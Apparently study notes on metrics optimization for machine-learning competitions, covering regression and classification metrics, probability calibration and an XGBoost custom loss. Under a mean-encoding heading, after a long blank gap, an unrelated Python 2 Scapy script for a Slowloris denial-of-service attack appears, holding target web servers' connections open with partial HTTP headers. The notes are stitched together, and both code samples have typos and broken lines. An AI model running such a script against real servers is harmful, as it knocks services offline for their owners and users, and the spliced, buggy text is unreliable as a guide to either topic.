# Metrics optimization

# Motivation

## Lesson overview

In this video:

- Metrics:
  - Why there are so many
  - Why should we care about them in competitions

In the following videos:

- Loss versus metric
- Review the most important  metrics
  - For classification and regression tasks
  - Discuss baseline solutions for their optimization
- Optimization techniques for the metrics

### Take-away point

If your model is scored with some metric, you get best results by optimizing exactly that metric

### Conclusion

- Why there are so many metics?
  - Different metrics for different problems
- Why should we care about metric in competitions?
  - It is how the competitions are ranked!



## Regression metrics review Ⅰ

### MAE vs MSE

- Do you have outliers in the data?
  - Use MAE
- Are you sure they are outliers?
  - Use MAE
- Or they are just unexpected values we should still care about?
  - Use MSE

### Conclusion

Discussed the following metrics:

- MSE, RMSE, R-squared
  - They are the same from optimization perspective
- MAE
  - Robust to outliers



## Regression metrics review Ⅱ

![](https://i.imgur.com/hP9P1Za.png)

### Conclusion

Discussed the metrics, sensitive to relative errors:

- (R)MSPE
  - Weighted version of MSE
- MAPE
  - Weighted version of MAE
- (R)MSLE
  - MSE in log space

## Classification metrics review

- Accuracy
- Logarithmic loss
- Area under ROC curve
- (Quadratic weighted) Kappa

### Area Under Curve (AUC ROC)

- Best constant:
  - All constants give same score
- Random predictions lead to AUC = 0.5

### Conclusion

- Accuracy
- Logloss
- AUC(ROC)
- (Quadratic weighted) Kappa

## General approaches for metrics optimization

### Loss and metric

- **Target metric** is what we want to optimize
- **Optimization loss** is what model optimizes

### Approaches for target metric optimization

- Just run the right model!
  - MSE, Logloss
- Preprocess train and optimize another metric
  - MSPE, MAPE, RMSLE, ...
- Optimize anther metric, postprocess predictions
  - Accuracy, Kappa
- Write custom loss function
  - Any, if you can

### Custom loss for XGBoost

Define an `objective`:

- function that computes first and second order derivatives w.r.t. predictions.

```python
def logregobj(preds, dtrina):
  labels = dtrain.get_label()
  preds = 1.0 / (1.0 + np.exp(-preds))
  grad = preds - labels
  hess = preds * (1.0-preds)
  return grad, hess
```

- Optimize another metric, use early stopping
  - any

### Conclusion

- Loss vs metric
- Approaches in general:
  - Just run the right model
  - Preprocess train and optimize another metric
  - Optimize another metric, postprocess predictions
  - Write a custom loss function
  - Optimize another metric, use early stopping

## Regression metrics optimization

### RMSE, MSE, R-squared

Tree-based

```python
XGBoost, LightGBM
sklearn.RandomForestRegressor
```

Linear models

```python
sklearn.<>Regression
sklearn.SGDRegressor
Vowpal Wabbit (quantile loss)
```

Neural nets

```python
PyTorch, Keras, TF, etc
```

### MSPE(MAPE)

- Use weights for samples(`sample_weights`)
  - And use MSE(MAE)
  - Not every library accepts sample weights
    - XGBoost, LightGBM accept
    - Neural nets
      - Easy to implement if not supported

- Resample the train set
  - df.sample(weights=sample_weights)
  - And use any model that optimizes MSE(MAE)
  - Usually need to resample many times and average

## Classification metrics optimization Ⅰ

- Logloss
- Accuracy
- AUC
- (Quadratic weighted) Kappa

### Probability calibration

- Platt scaling
  - Just fit Logistic Regression to your predictions (like in stacking)
- Isotonic regression
  - Just fit isotonic Regression to your predictions (like in stacking)
- Stacking
  - Just fit XGBoost or neural net to your predictions

## Classification metrics optimization Ⅱ

### Quandratic weighted Kappa

How do you optimize it?

- Optimize MSE and find right thresholds
  - Simple
- Custom smooth loss for GBDT or neural nets
  - Harder

# Mean encodings

## Concept of mean encoding

### Using target to generate features















































```python
#!/usr/bin/env python

import sys
import time
from scapy.all import *

def slowloris(target, num):
  print "start connect > {}".format(target)
  syn = []
  for i in range(num):
    syn.append(IP(dst=target)/TCP(sport=RandNum(1024,65535), dport=80, flasg='S'))
   
  syn_ack = sr(syn, verbose=0)[0]
  
  ack = []
  
  for sa in syn_ack:
    payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1, num))) + \
    "Host: {}\r\n".format(target) + \
    "User-Agent: Mozilla/4.0\r\n" + \
    "Content-Length: 42\r\n"
    
    ack.append(IP(dst=target)/TCP(sport=sa[1].dport, dport=80, flags="A", seq=sa[1].ack, ack=sa[1].seq+1)/payload)
    
    answer = sr(ack, verbose=0)[0]
    print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
    print "Sending data \"X-a: n\\r\\n\".."
    
    count = 1
    while True:
      print "{} time speding".format(count)
      ack = []
      for ans in answer:
        ack.append(IP(dst=target)/TCP(sport=ans[1].dport, dport=80, flags="PA", seq=ans[1].ack, ack=ans[1].seq/"X-a: b\r\n"))
        
      answer = sr(ack, inter=0.5, verbose = 0)[0]
      time.sleep(10)
      count += 1
      
      
if __name__ == "__main__":
  if len(sys.argv) < 3 :
    print "Usage: {} <target> <number of connection>".format(sys.argv[0])
    sys.exit(1)
    
  slowloris(sys.argv[1], int(sys.argv[2]))




```











